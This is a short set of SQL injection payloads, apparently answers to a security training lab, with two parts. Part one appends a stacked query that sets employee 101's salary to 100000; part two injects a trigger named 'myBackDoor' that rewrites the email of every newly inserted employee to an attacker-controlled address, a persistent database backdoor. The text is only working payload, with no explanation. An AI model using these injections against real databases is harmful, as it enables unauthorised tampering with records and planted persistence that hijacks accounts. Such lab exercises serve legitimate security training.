part1:
101;
update employee set salary=100000 where userid = 101;

part2:
101;
create trigger myBackDoor before insert on employee for each row begin update employee set email= 'john@hackme.com' where userid=new.userid;
